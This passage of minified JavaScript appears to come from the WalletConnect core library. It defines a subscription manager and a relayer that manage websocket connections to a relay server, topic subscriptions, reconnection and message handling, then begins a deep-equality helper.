                _w(this, "delete", ( (e, t) => {
                    if (typeof t > "u")
                        return void this.map.delete(e);
                    if (!this.map.has(e))
                        return;
                    const r = this.get(e);
                    if (!this.exists(e, t))
                        return;
                    const n = r.filter((e => e !== t));
                    n.length ? this.map.set(e, n) : this.map.delete(e)
                }
                )),
                _w(this, "clear", ( () => {
                    this.map.clear()
                }
                ))
            }
            get topics() {
                return Array.from(this.map.keys())
            }
        }
        var Rw = Object.defineProperty
          , kw = Object.defineProperties
          , Mw = Object.getOwnPropertyDescriptors
          , Nw = Object.getOwnPropertySymbols
          , Fw = Object.prototype.hasOwnProperty
          , Uw = Object.prototype.propertyIsEnumerable
          , Dw = (e, t, r) => t in e ? Rw(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , Lw = (e, t) => {
            for (var r in t || (t = {}))
                Fw.call(t, r) && Dw(e, r, t[r]);
            if (Nw)
                for (var r of Nw(t))
                    Uw.call(t, r) && Dw(e, r, t[r]);
            return e
        }
          , jw = (e, t) => kw(e, Mw(t))
          , zw = (e, t, r) => Dw(e, "symbol" != typeof t ? t + "" : t, r);
        class Vw extends Gt {
            constructor(e, t) {
                super(e, t),
                this.relayer = e,
                this.logger = t,
                zw(this, "subscriptions", new Map),
                zw(this, "topicMap", new Ww),
                zw(this, "events", new Se.EventEmitter),
                zw(this, "name", "subscription"),
                zw(this, "version", "0.3"),
                zw(this, "pending", new Map),
                zw(this, "cached", []),
                zw(this, "initialized", !1),
                zw(this, "storagePrefix", $y),
                zw(this, "subscribeTimeout", (0,
                Be.toMiliseconds)(Be.ONE_MINUTE)),
                zw(this, "initialSubscribeTimeout", (0,
                Be.toMiliseconds)(15 * Be.ONE_SECOND)),
                zw(this, "clientId"),
                zw(this, "batchSubscribeTopicsLimit", 500),
                zw(this, "init", (async () => {
                    this.initialized || (this.logger.trace("Initialized"),
                    this.registerEventListeners(),
                    await this.restore()),
                    this.initialized = !0
                }
                )),
                zw(this, "subscribe", (async (e, t) => {
                    this.isInitialized(),
                    this.logger.debug("Subscribing Topic"),
                    this.logger.trace({
                        type: "method",
                        method: "subscribe",
                        params: {
                            topic: e,
                            opts: t
                        }
                    });
                    try {
                        const r = gg(t)
                          , n = {
                            topic: e,
                            relay: r,
                            transportType: null === t || void 0 === t ? void 0 : t.transportType
                        };
                        this.pending.set(e, n);
                        const o = await this.rpcSubscribe(e, r, t);
                        return "string" == typeof o && (this.onSubscribe(o, n),
                        this.logger.debug("Successfully Subscribed Topic"),
                        this.logger.trace({
                            type: "method",
                            method: "subscribe",
                            params: {
                                topic: e,
                                opts: t
                            }
                        })),
                        o
                    } catch (Oe) {
                        throw this.logger.debug("Failed to Subscribe Topic"),
                        this.logger.error(Oe),
                        Oe
                    }
                }
                )),
                zw(this, "unsubscribe", (async (e, t) => {
                    this.isInitialized(),
                    typeof (null === t || void 0 === t ? void 0 : t.id) < "u" ? await this.unsubscribeById(e, t.id, t) : await this.unsubscribeByTopic(e, t)
                }
                )),
                zw(this, "isSubscribed", (e => new Promise((t => {
                    t(this.topicMap.topics.includes(e))
                }
                )))),
                zw(this, "isKnownTopic", (e => new Promise((t => {
                    t(this.topicMap.topics.includes(e) || this.pending.has(e) || this.cached.some((t => t.topic === e)))
                }
                )))),
                zw(this, "on", ( (e, t) => {
                    this.events.on(e, t)
                }
                )),
                zw(this, "once", ( (e, t) => {
                    this.events.once(e, t)
                }
                )),
                zw(this, "off", ( (e, t) => {
                    this.events.off(e, t)
                }
                )),
                zw(this, "removeListener", ( (e, t) => {
                    this.events.removeListener(e, t)
                }
                )),
                zw(this, "start", (async () => {
                    await this.onConnect()
                }
                )),
                zw(this, "stop", (async () => {
                    await this.onDisconnect()
                }
                )),
                zw(this, "restart", (async () => {
                    await this.restore(),
                    await this.onRestart()
                }
                )),
                zw(this, "checkPending", (async () => {
                    if (0 === this.pending.size && (!this.initialized || !this.relayer.connected))
                        return;
                    const e = [];
                    this.pending.forEach((t => {
                        e.push(t)
                    }
                    )),
                    await this.batchSubscribe(e)
                }
                )),
                zw(this, "registerEventListeners", ( () => {
                    this.relayer.core.heartbeat.on(We, (async () => {
                        await this.checkPending()
                    }
                    )),
                    this.events.on(ym, (async e => {
                        const t = ym;
                        this.logger.info("Emitting ".concat(t)),
                        this.logger.debug({
                            type: "event",
                            event: t,
                            data: e
                        }),
                        await this.persist()
                    }
                    )),
                    this.events.on(mm, (async e => {
                        const t = mm;
                        this.logger.info("Emitting ".concat(t)),
                        this.logger.debug({
                            type: "event",
                            event: t,
                            data: e
                        }),
                        await this.persist()
                    }
                    ))
                }
                )),
                this.relayer = e,
                this.logger = kt(t, this.name),
                this.clientId = ""
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.relayer.core.customStoragePrefix + "//" + this.name
            }
            get length() {
                return this.subscriptions.size
            }
            get ids() {
                return Array.from(this.subscriptions.keys())
            }
            get values() {
                return Array.from(this.subscriptions.values())
            }
            get topics() {
                return this.topicMap.topics
            }
            get hasAnyTopics() {
                return this.topicMap.topics.length > 0 || this.pending.size > 0 || this.cached.length > 0 || this.subscriptions.size > 0
            }
            hasSubscription(e, t) {
                let r = !1;
                try {
                    r = this.getSubscription(e).topic === t
                } catch (n) {}
                return r
            }
            reset() {
                this.cached = [],
                this.initialized = !0
            }
            onDisable() {
                this.values.length > 0 && (this.cached = this.values),
                this.subscriptions.clear(),
                this.topicMap.clear()
            }
            async unsubscribeByTopic(e, t) {
                const r = this.topicMap.get(e);
                await Promise.all(r.map((async r => await this.unsubscribeById(e, r, t))))
            }
            async unsubscribeById(e, t, r) {
                this.logger.debug("Unsubscribing Topic"),
                this.logger.trace({
                    type: "method",
                    method: "unsubscribe",
                    params: {
                        topic: e,
                        id: t,
                        opts: r
                    }
                });
                try {
                    const n = gg(r);
                    await this.restartToComplete({
                        topic: e,
                        id: t,
                        relay: n
                    }),
                    await this.rpcUnsubscribe(e, t, n);
                    const o = Dg("USER_DISCONNECTED", "".concat(this.name, ", ").concat(e));
                    await this.onUnsubscribe(e, t, o),
                    this.logger.debug("Successfully Unsubscribed Topic"),
                    this.logger.trace({
                        type: "method",
                        method: "unsubscribe",
                        params: {
                            topic: e,
                            id: t,
                            opts: r
                        }
                    })
                } catch (_e) {
                    throw this.logger.debug("Failed to Unsubscribe Topic"),
                    this.logger.error(_e),
                    _e
                }
            }
            async rpcSubscribe(e, t, r) {
                var n;
                (!r || (null === r || void 0 === r ? void 0 : r.transportType) === hm.relay) && await this.restartToComplete({
                    topic: e,
                    id: e,
                    relay: t
                });
                const o = {
                    method: yg(t.protocol).subscribe,
                    params: {
                        topic: e
                    }
                };
                this.logger.debug("Outgoing Relay Payload"),
                this.logger.trace({
                    type: "payload",
                    direction: "outgoing",
                    request: o
                });
                const i = null == (n = null === r || void 0 === r ? void 0 : r.internal) ? void 0 : n.throwOnFailedPublish;
                try {
                    const t = await this.getSubscriptionId(e);
                    if ((null === r || void 0 === r ? void 0 : r.transportType) === hm.link_mode)
                        return setTimeout(( () => {
                            (this.relayer.connected || this.relayer.connecting) && this.relayer.request(o).catch((e => this.logger.warn(e)))
                        }
                        ), (0,
                        Be.toMiliseconds)(Be.ONE_SECOND)),
                        t;
                    const n = new Promise((async t => {
                        const r = n => {
                            n.topic === e && (this.events.removeListener(ym, r),
                            t(n.id))
                        }
                        ;
                        this.events.on(ym, r);
                        try {
                            const n = await lu(new Promise(( (e, t) => {
                                this.relayer.request(o).catch((e => {
                                    this.logger.warn(e, null === e || void 0 === e ? void 0 : e.message),
                                    t(e)
                                }
                                )).then(e)
                            }
                            )), this.initialSubscribeTimeout, "Subscribing to ".concat(e, " failed, please try again"));
                            this.events.removeListener(ym, r),
                            t(n)
                        } catch (n) {}
                    }
                    ))
                      , s = await lu(n, this.subscribeTimeout, "Subscribing to ".concat(e, " failed, please try again"));
                    if (!s && i)
                        throw new Error("Subscribing to ".concat(e, " failed, please try again"));
                    return s ? t : null
                } catch (Nt) {
                    if (this.logger.debug("Outgoing Relay Subscribe Payload stalled"),
                    this.relayer.events.emit(im),
                    i)
                        throw Nt
                }
                return null
            }
            async rpcBatchSubscribe(e) {
                if (!e.length)
                    return;
                const t = {
                    method: yg(e[0].relay.protocol).batchSubscribe,
                    params: {
                        topics: e.map((e => e.topic))
                    }
                };
                this.logger.debug("Outgoing Relay Payload"),
                this.logger.trace({
                    type: "payload",
                    direction: "outgoing",
                    request: t
                });
                try {
                    await await lu(new Promise((e => {
                        this.relayer.request(t).catch((e => this.logger.warn(e))).then(e)
                    }
                    )), this.subscribeTimeout, "rpcBatchSubscribe failed, please try again")
                } catch (r) {
                    this.relayer.events.emit(im)
                }
            }
            async rpcBatchFetchMessages(e) {
                if (!e.length)
                    return;
                const t = {
                    method: yg(e[0].relay.protocol).batchFetchMessages,
                    params: {
                        topics: e.map((e => e.topic))
                    }
                };
                let r;
                this.logger.debug("Outgoing Relay Payload"),
                this.logger.trace({
                    type: "payload",
                    direction: "outgoing",
                    request: t
                });
                try {
                    r = await await lu(new Promise(( (e, r) => {
                        this.relayer.request(t).catch((e => {
                            this.logger.warn(e),
                            r(e)
                        }
                        )).then(e)
                    }
                    )), this.subscribeTimeout, "rpcBatchFetchMessages failed, please try again")
                } catch (n) {
                    this.relayer.events.emit(im)
                }
                return r
            }
            rpcUnsubscribe(e, t, r) {
                const n = {
                    method: yg(r.protocol).unsubscribe,
                    params: {
                        topic: e,
                        id: t
                    }
                };
                return this.logger.debug("Outgoing Relay Payload"),
                this.logger.trace({
                    type: "payload",
                    direction: "outgoing",
                    request: n
                }),
                this.relayer.request(n)
            }
            onSubscribe(e, t) {
                this.setSubscription(e, jw(Lw({}, t), {
                    id: e
                })),
                this.pending.delete(t.topic)
            }
            onBatchSubscribe(e) {
                e.length && e.forEach((e => {
                    this.setSubscription(e.id, Lw({}, e)),
                    this.pending.delete(e.topic)
                }
                ))
            }
            async onUnsubscribe(e, t, r) {
                this.events.removeAllListeners(t),
                this.hasSubscription(t, e) && this.deleteSubscription(t, r),
                await this.relayer.messages.del(e)
            }
            async setRelayerSubscriptions(e) {
                await this.relayer.core.storage.setItem(this.storageKey, e)
            }
            async getRelayerSubscriptions() {
                return await this.relayer.core.storage.getItem(this.storageKey)
            }
            setSubscription(e, t) {
                this.logger.debug("Setting subscription"),
                this.logger.trace({
                    type: "method",
                    method: "setSubscription",
                    id: e,
                    subscription: t
                }),
                this.addSubscription(e, t)
            }
            addSubscription(e, t) {
                this.subscriptions.set(e, Lw({}, t)),
                this.topicMap.set(t.topic, e),
                this.events.emit(ym, t)
            }
            getSubscription(e) {
                this.logger.debug("Getting subscription"),
                this.logger.trace({
                    type: "method",
                    method: "getSubscription",
                    id: e
                });
                const t = this.subscriptions.get(e);
                if (!t) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "".concat(this.name, ": ").concat(e));
                    throw new Error(t)
                }
                return t
            }
            deleteSubscription(e, t) {
                this.logger.debug("Deleting subscription"),
                this.logger.trace({
                    type: "method",
                    method: "deleteSubscription",
                    id: e,
                    reason: t
                });
                const r = this.getSubscription(e);
                this.subscriptions.delete(e),
                this.topicMap.delete(r.topic, e),
                this.events.emit(mm, jw(Lw({}, r), {
                    reason: t
                }))
            }
            async persist() {
                await this.setRelayerSubscriptions(this.values),
                this.events.emit(bm)
            }
            async onRestart() {
                if (this.cached.length) {
                    const e = [...this.cached]
                      , t = Math.ceil(this.cached.length / this.batchSubscribeTopicsLimit);
                    for (let r = 0; r < t; r++) {
                        const t = e.splice(0, this.batchSubscribeTopicsLimit);
                        await this.batchSubscribe(t)
                    }
                }
                this.events.emit(vm)
            }
            async restore() {
                try {
                    const e = await this.getRelayerSubscriptions();
                    if (typeof e > "u" || !e.length)
                        return;
                    if (this.subscriptions.size) {
                        const {message: e} = Ug("RESTORE_WILL_OVERRIDE", this.name);
                        throw this.logger.error(e),
                        this.logger.error("".concat(this.name, ": ").concat(JSON.stringify(this.values))),
                        new Error(e)
                    }
                    this.cached = e,
                    this.logger.debug("Successfully Restored subscriptions for ".concat(this.name)),
                    this.logger.trace({
                        type: "method",
                        method: "restore",
                        subscriptions: this.values
                    })
                } catch (_l) {
                    this.logger.debug("Failed to Restore subscriptions for ".concat(this.name)),
                    this.logger.error(_l)
                }
            }
            async batchSubscribe(e) {
                e.length && (await this.rpcBatchSubscribe(e),
                this.onBatchSubscribe(await Promise.all(e.map((async e => jw(Lw({}, e), {
                    id: await this.getSubscriptionId(e.topic)
                }))))))
            }
            async batchFetchMessages(e) {
                if (!e.length)
                    return;
                this.logger.trace("Fetching batch messages for ".concat(e.length, " subscriptions"));
                const t = await this.rpcBatchFetchMessages(e);
                t && t.messages && (await function(e) {
                    return new Promise((t => setTimeout(t, e)))
                }((0,
                Be.toMiliseconds)(Be.ONE_SECOND)),
                await this.relayer.handleBatchMessageEvents(t.messages))
            }
            async onConnect() {
                await this.restart(),
                this.reset()
            }
            onDisconnect() {
                this.onDisable()
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
            async restartToComplete(e) {
                !this.relayer.connected && !this.relayer.connecting && (this.cached.push(e),
                await this.relayer.transportOpen())
            }
            async getClientId() {
                return this.clientId || (this.clientId = await this.relayer.core.crypto.getClientId()),
                this.clientId
            }
            async getSubscriptionId(e) {
                return og(e + await this.getClientId())
            }
        }
        var Hw = Object.defineProperty
          , qw = Object.getOwnPropertySymbols
          , Gw = Object.prototype.hasOwnProperty
          , $w = Object.prototype.propertyIsEnumerable
          , Kw = (e, t, r) => t in e ? Hw(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , Zw = (e, t) => {
            for (var r in t || (t = {}))
                Gw.call(t, r) && Kw(e, r, t[r]);
            if (qw)
                for (var r of qw(t))
                    $w.call(t, r) && Kw(e, r, t[r]);
            return e
        }
          , Yw = (e, t, r) => Kw(e, "symbol" != typeof t ? t + "" : t, r);
        class Jw extends Ht {
            constructor(e) {
                super(e),
                Yw(this, "protocol", "wc"),
                Yw(this, "version", 2),
                Yw(this, "core"),
                Yw(this, "logger"),
                Yw(this, "events", new Se.EventEmitter),
                Yw(this, "provider"),
                Yw(this, "messages"),
                Yw(this, "subscriber"),
                Yw(this, "publisher"),
                Yw(this, "name", "relayer"),
                Yw(this, "transportExplicitlyClosed", !1),
                Yw(this, "initialized", !1),
                Yw(this, "connectionAttemptInProgress", !1),
                Yw(this, "relayUrl"),
                Yw(this, "projectId"),
                Yw(this, "packageName"),
                Yw(this, "bundleId"),
                Yw(this, "hasExperiencedNetworkDisruption", !1),
                Yw(this, "pingTimeout"),
                Yw(this, "heartBeatTimeout", (0,
                Be.toMiliseconds)(Be.THIRTY_SECONDS + Be.FIVE_SECONDS)),
                Yw(this, "reconnectTimeout"),
                Yw(this, "connectPromise"),
                Yw(this, "reconnectInProgress", !1),
                Yw(this, "requestsInFlight", []),
                Yw(this, "connectTimeout", (0,
                Be.toMiliseconds)(15 * Be.ONE_SECOND)),
                Yw(this, "request", (async e => {
                    var t, r;
                    this.logger.debug("Publishing Request Payload");
                    const n = e.id || Sy().toString();
                    await this.toEstablishConnection();
                    try {
                        this.logger.trace({
                            id: n,
                            method: e.method,
                            topic: null == (t = e.params) ? void 0 : t.topic
                        }, "relayer.request - publishing...");
                        const o = "".concat(n, ":").concat((null == (r = e.params) ? void 0 : r.tag) || "");
                        this.requestsInFlight.push(o);
                        const i = await this.provider.request(e);
                        return this.requestsInFlight = this.requestsInFlight.filter((e => e !== o)),
                        i
                    } catch (o) {
                        throw this.logger.debug("Failed to Publish Request: ".concat(n)),
                        o
                    }
                }
                )),
                Yw(this, "resetPingTimeout", ( () => {
                    Yl() && (clearTimeout(this.pingTimeout),
                    this.pingTimeout = setTimeout(( () => {
                        var e, t, r, n;
                        try {
                            this.logger.debug({}, "pingTimeout: Connection stalled, terminating..."),
                            null == (n = null == (r = null == (t = null == (e = this.provider) ? void 0 : e.connection) ? void 0 : t.socket) ? void 0 : r.terminate) || n.call(r)
                        } catch (o) {
                            this.logger.warn(o, null === o || void 0 === o ? void 0 : o.message)
                        }
                    }
                    ), this.heartBeatTimeout))
                }
                )),
                Yw(this, "onPayloadHandler", (e => {
                    this.onProviderPayload(e),
                    this.resetPingTimeout()
                }
                )),
                Yw(this, "onConnectHandler", ( () => {
                    this.logger.warn({}, "Relayer connected \ud83d\udedc"),
                    this.startPingTimeout(),
                    this.events.emit(rm)
                }
                )),
                Yw(this, "onDisconnectHandler", ( () => {
                    this.logger.warn({}, "Relayer disconnected \ud83d\uded1"),
                    this.requestsInFlight = [],
                    this.onProviderDisconnect()
                }
                )),
                Yw(this, "onProviderErrorHandler", (e => {
                    this.logger.fatal("Fatal socket error: ".concat(e.message)),
                    this.events.emit(om, e),
                    this.logger.fatal("Fatal socket error received, closing transport"),
                    this.transportClose()
                }
                )),
                Yw(this, "registerProviderListeners", ( () => {
                    this.provider.on(am, this.onPayloadHandler),
                    this.provider.on(cm, this.onConnectHandler),
                    this.provider.on(lm, this.onDisconnectHandler),
                    this.provider.on(um, this.onProviderErrorHandler)
                }
                )),
                this.core = e.core,
                this.logger = typeof e.logger < "u" && "string" != typeof e.logger ? kt(e.logger, this.name) : pt()(Wt({
                    level: e.logger || "error"
                })),
                this.messages = new bw(this.logger,e.core),
                this.subscriber = new Vw(this,this.logger),
                this.publisher = new xw(this,this.logger),
                this.relayUrl = (null === e || void 0 === e ? void 0 : e.relayUrl) || Qy,
                this.projectId = e.projectId,
                Jl() && typeof r.g < "u" && typeof (null == r.g ? void 0 : r.g.Platform) < "u" && "android" === (null == r.g ? void 0 : r.g.Platform.OS) ? this.packageName = eu() : Jl() && typeof r.g < "u" && typeof (null == r.g ? void 0 : r.g.Platform) < "u" && "ios" === (null == r.g ? void 0 : r.g.Platform.OS) && (this.bundleId = eu()),
                this.provider = {}
            }
            async init() {
                if (this.logger.trace("Initialized"),
                this.registerEventListeners(),
                await Promise.all([this.messages.init(), this.subscriber.init()]),
                this.initialized = !0,
                this.subscriber.hasAnyTopics)
                    try {
                        await this.transportOpen()
                    } catch (_l) {
                        this.logger.warn(_l, null === _l || void 0 === _l ? void 0 : _l.message)
                    }
            }
            get context() {
                return Rt(this.logger)
            }
            get connected() {
                var e, t, r;
                return 1 === (null == (r = null == (t = null == (e = this.provider) ? void 0 : e.connection) ? void 0 : t.socket) ? void 0 : r.readyState) || !1
            }
            get connecting() {
                var e, t, r;
                return 0 === (null == (r = null == (t = null == (e = this.provider) ? void 0 : e.connection) ? void 0 : t.socket) ? void 0 : r.readyState) || void 0 !== this.connectPromise || !1
            }
            async publish(e, t, r) {
                this.isInitialized(),
                await this.publisher.publish(e, t, r),
                await this.recordMessageEvent({
                    topic: e,
                    message: t,
                    publishedAt: Date.now(),
                    transportType: hm.relay
                }, pm)
            }
            async subscribe(e, t) {
                var r, n, o;
                this.isInitialized(),
                (null == t || !t.transportType || "relay" === (null === t || void 0 === t ? void 0 : t.transportType)) && await this.toEstablishConnection();
                const i = typeof (null == (r = null === t || void 0 === t ? void 0 : t.internal) ? void 0 : r.throwOnFailedPublish) > "u" || (null == (n = null === t || void 0 === t ? void 0 : t.internal) ? void 0 : n.throwOnFailedPublish);
                let s, a = (null == (o = this.subscriber.topicMap.get(e)) ? void 0 : o[0]) || "";
                const c = t => {
                    t.topic === e && (this.subscriber.off(ym, c),
                    s())
                }
                ;
                return await Promise.all([new Promise((e => {
                    s = e,
                    this.subscriber.on(ym, c)
                }
                )), new Promise((async (r, n) => {
                    a = await this.subscriber.subscribe(e, Zw({
                        internal: {
                            throwOnFailedPublish: i
                        }
                    }, t)).catch((e => {
                        i && n(e)
                    }
                    )) || a,
                    r()
                }
                ))]),
                a
            }
            async unsubscribe(e, t) {
                this.isInitialized(),
                await this.subscriber.unsubscribe(e, t)
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            async transportDisconnect() {
                this.provider.disconnect && (this.hasExperiencedNetworkDisruption || this.connected) ? await lu(this.provider.disconnect(), 2e3, "provider.disconnect()").catch(( () => this.onProviderDisconnect())) : this.onProviderDisconnect()
            }
            async transportClose() {
                this.transportExplicitlyClosed = !0,
                await this.transportDisconnect()
            }
            async transportOpen(e) {
                if (this.subscriber.hasAnyTopics) {
                    if (this.connectPromise ? (this.logger.debug({}, "Waiting for existing connection attempt to resolve..."),
                    await this.connectPromise,
                    this.logger.debug({}, "Existing connection attempt resolved")) : (this.connectPromise = new Promise((async (t, r) => {
                        await this.connect(e).then(t).catch(r).finally(( () => {
                            this.connectPromise = void 0
                        }
                        ))
                    }
                    )),
                    await this.connectPromise),
                    !this.connected)
                        throw new Error("Couldn't establish socket connection to the relay server: ".concat(this.relayUrl))
                } else
                    this.logger.warn("Starting WS connection skipped because the client has no topics to work with.")
            }
            async restartTransport(e) {
                this.logger.debug({}, "Restarting transport..."),
                !this.connectionAttemptInProgress && (this.relayUrl = e || this.relayUrl,
                await this.confirmOnlineStateOrThrow(),
                await this.transportClose(),
                await this.transportOpen())
            }
            async confirmOnlineStateOrThrow() {
                if (!await oy())
                    throw new Error("No internet connection detected. Please restart your network and try again.")
            }
            async handleBatchMessageEvents(e) {
                if (0 === (null === e || void 0 === e ? void 0 : e.length))
                    return void this.logger.trace("Batch message events is empty. Ignoring...");
                const t = e.sort(( (e, t) => e.publishedAt - t.publishedAt));
                this.logger.debug("Batch of ".concat(t.length, " message events sorted"));
                for (const r of t)
                    try {
                        await this.onMessageEvent(r)
                    } catch (_e) {
                        this.logger.warn(_e, "Error while processing batch message event: " + (null === _e || void 0 === _e ? void 0 : _e.message))
                    }
                this.logger.trace("Batch of ".concat(t.length, " message events processed"))
            }
            async onLinkMessageEvent(e, t) {
                const {topic: r} = e;
                if (!t.sessionExists) {
                    const e = {
                        topic: r,
                        expiry: hu(Be.FIVE_MINUTES),
                        relay: {
                            protocol: "irn"
                        },
                        active: !1
                    };
                    await this.core.pairing.pairings.set(r, e)
                }
                this.events.emit(em, e),
                await this.recordMessageEvent(e, fm)
            }
            async connect(e) {
                await this.confirmOnlineStateOrThrow(),
                e && e !== this.relayUrl && (this.relayUrl = e,
                await this.transportDisconnect()),
                this.connectionAttemptInProgress = !0,
                this.transportExplicitlyClosed = !1;
                let t = 1;
                for (; t < 6; ) {
                    try {
                        if (this.transportExplicitlyClosed)
                            break;
                        this.logger.debug({}, "Connecting to ".concat(this.relayUrl, ", attempt: ").concat(t, "...")),
                        await this.createProvider(),
                        await new Promise((async (e, t) => {
                            const r = () => {
                                t(new Error("Connection interrupted while trying to subscribe"))
                            }
                            ;
                            this.provider.once(lm, r),
                            await lu(new Promise(( (e, t) => {
                                this.provider.connect().then(e).catch(t)
                            }
                            )), this.connectTimeout, "Socket stalled when trying to connect to ".concat(this.relayUrl)).catch((e => {
                                t(e)
                            }
                            )).finally(( () => {
                                this.provider.off(lm, r),
                                clearTimeout(this.reconnectTimeout)
                            }
                            )),
                            await new Promise((async (e, t) => {
                                const r = () => {
                                    t(new Error("Connection interrupted while trying to subscribe"))
                                }
                                ;
                                this.provider.once(lm, r),
                                await this.subscriber.start().then(e).catch(t).finally(( () => {
                                    this.provider.off(lm, r)
                                }
                                ))
                            }
                            )),
                            this.hasExperiencedNetworkDisruption = !1,
                            e()
                        }
                        ))
                    } catch (Ot) {
                        await this.subscriber.stop();
                        const t = Ot;
                        this.logger.warn({}, t.message),
                        this.hasExperiencedNetworkDisruption = !0
                    } finally {
                        this.connectionAttemptInProgress = !1
                    }
                    if (this.connected) {
                        this.logger.debug({}, "Connected to ".concat(this.relayUrl, " successfully on attempt: ").concat(t));
                        break
                    }
                    await new Promise((e => setTimeout(e, (0,
                    Be.toMiliseconds)(1 * t)))),
                    t++
                }
            }
            startPingTimeout() {
                var e, t, r, n, o;
                if (Yl())
                    try {
                        null != (t = null == (e = this.provider) ? void 0 : e.connection) && t.socket && (null == (o = null == (n = null == (r = this.provider) ? void 0 : r.connection) ? void 0 : n.socket) || o.on("ping", ( () => {
                            this.resetPingTimeout()
                        }
                        ))),
                        this.resetPingTimeout()
                    } catch (i) {
                        this.logger.warn(i, null === i || void 0 === i ? void 0 : i.message)
                    }
            }
            async createProvider() {
                this.provider.connection && this.unregisterProviderListeners();
                const e = await this.core.crypto.signJWT(this.relayUrl);
                this.provider = new zy(new qy(ou({
                    sdkVersion: dm,
                    protocol: this.protocol,
                    version: this.version,
                    relayUrl: this.relayUrl,
                    projectId: this.projectId,
                    auth: e,
                    useOnCloseEvent: !0,
                    bundleId: this.bundleId,
                    packageName: this.packageName
                }))),
                this.registerProviderListeners()
            }
            async recordMessageEvent(e, t) {
                const {topic: r, message: n} = e;
                await this.messages.set(r, n, t)
            }
            async shouldIgnoreMessageEvent(e) {
                const {topic: t, message: r} = e;
                if (!r || 0 === r.length)
                    return this.logger.warn("Ignoring invalid/empty message: ".concat(r)),
                    !0;
                if (!await this.subscriber.isKnownTopic(t))
                    return this.logger.warn("Ignoring message for unknown topic ".concat(t)),
                    !0;
                const n = this.messages.has(t, r);
                return n && this.logger.warn("Ignoring duplicate message: ".concat(r)),
                n
            }
            async onProviderPayload(e) {
                if (this.logger.debug("Incoming Relay Payload"),
                this.logger.trace({
                    type: "payload",
                    direction: "incoming",
                    payload: e
                }),
                Uy(e)) {
                    if (!e.method.endsWith("_subscription"))
                        return;
                    const t = e.params
                      , {topic: r, message: n, publishedAt: o, attestation: i} = t.data
                      , s = {
                        topic: r,
                        message: n,
                        publishedAt: o,
                        transportType: hm.relay,
                        attestation: i
                    };
                    this.logger.debug("Emitting Relayer Payload"),
                    this.logger.trace(Zw({
                        type: "event",
                        event: t.id
                    }, s)),
                    this.events.emit(t.id, s),
                    await this.acknowledgePayload(e),
                    await this.onMessageEvent(s)
                } else
                    Dy(e) && this.events.emit(tm, e)
            }
            async onMessageEvent(e) {
                await this.shouldIgnoreMessageEvent(e) || (await this.recordMessageEvent(e, fm),
                this.events.emit(em, e))
            }
            async acknowledgePayload(e) {
                const t = By(e.id, !0);
                await this.provider.connection.send(t)
            }
            unregisterProviderListeners() {
                this.provider.off(am, this.onPayloadHandler),
                this.provider.off(cm, this.onConnectHandler),
                this.provider.off(lm, this.onDisconnectHandler),
                this.provider.off(um, this.onProviderErrorHandler),
                clearTimeout(this.pingTimeout)
            }
            async registerEventListeners() {
                let e = await oy();
                iy((async t => {
                    e !== t && (e = t,
                    t ? await this.transportOpen().catch((e => this.logger.error(e, null === e || void 0 === e ? void 0 : e.message))) : (this.hasExperiencedNetworkDisruption = !0,
                    await this.transportDisconnect(),
                    this.transportExplicitlyClosed = !1))
                }
                )),
                this.core.heartbeat.on(We, (async () => {
                    if (!this.transportExplicitlyClosed && !this.connected && function() {
                        var e;
                        return !Xl() || !(0,
                        Hi.getDocument)() || "visible" === (null == (e = (0,
                        Hi.getDocument)()) ? void 0 : e.visibilityState)
                    }())
                        try {
                            await this.confirmOnlineStateOrThrow(),
                            await this.transportOpen()
                        } catch (cf) {
                            this.logger.warn(cf, null === cf || void 0 === cf ? void 0 : cf.message)
                        }
                }
                ))
            }
            async onProviderDisconnect() {
                clearTimeout(this.pingTimeout),
                this.events.emit(nm),
                this.connectionAttemptInProgress = !1,
                !this.reconnectInProgress && (this.reconnectInProgress = !0,
                await this.subscriber.stop(),
                this.subscriber.hasAnyTopics && (this.transportExplicitlyClosed || (this.reconnectTimeout = setTimeout((async () => {
                    await this.transportOpen().catch((e => this.logger.error(e, null === e || void 0 === e ? void 0 : e.message))),
                    this.reconnectTimeout = void 0,
                    this.reconnectInProgress = !1
                }
                ), (0,
                Be.toMiliseconds)(.1)))))
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
            async toEstablishConnection() {
                if (await this.confirmOnlineStateOrThrow(),
                !this.connected) {
                    if (this.connectPromise)
                        return void await this.connectPromise;
                    await this.connect()
                }
            }
        }
        function Xw(e) {
            return Object.getOwnPropertySymbols(e).filter((t => Object.prototype.propertyIsEnumerable.call(e, t)))
        }
        function Qw(e) {
            return null == e ? void 0 === e ? "[object Undefined]" : "[object Null]" : Object.prototype.toString.call(e)
        }
        const eT = "[object Arguments]"
          , tT = "[object Object]";
        function rT(e) {
            if (!e || "object" != typeof e)
                return !1;
            const t = Object.getPrototypeOf(e);
            return (null === t || t === Object.prototype || null === Object.getPrototypeOf(t)) && "[object Object]" === Object.prototype.toString.call(e)
        }
        function nT(e, t, r, n, o, i, s) {
            const a = s(e, t, r, n, o, i);
            if (void 0 !== a)
                return a;
            if (typeof e == typeof t)
                switch (typeof e) {
                case "bigint":
                case "string":
                case "boolean":
                case "symbol":
                case "undefined":
                case "function":
                    return e === t;
                case "number":
                    return e === t || Object.is(e, t);
                case "object":
                    return oT(e, t, i, s)
                }
            return oT(e, t, i, s)
        }
        function oT(e, t, r, n) {
            if (Object.is(e, t))
                return !0;
            let o = Qw(e)
              , i = Qw(t);
            if (o === eT && (o = tT),
            i === eT && (i = tT),
            o !== i)
                return !1;
            switch (o) {
            case "[object String]":
                return e.toString() === t.toString();
            case "[object Number]":
                return function(e, t) {
                    return e === t || Number.isNaN(e) && Number.isNaN(t)
                }(e.valueOf(), t.valueOf());
            case "[object Boolean]":
            case "[object Date]":
            case "[object Symbol]":
                return Object.is(e.valueOf(), t.valueOf());
            case "[object RegExp]":
                return e.source === t.source && e.flags === t.flags;
            case "[object Function]":
                return e === t
            }
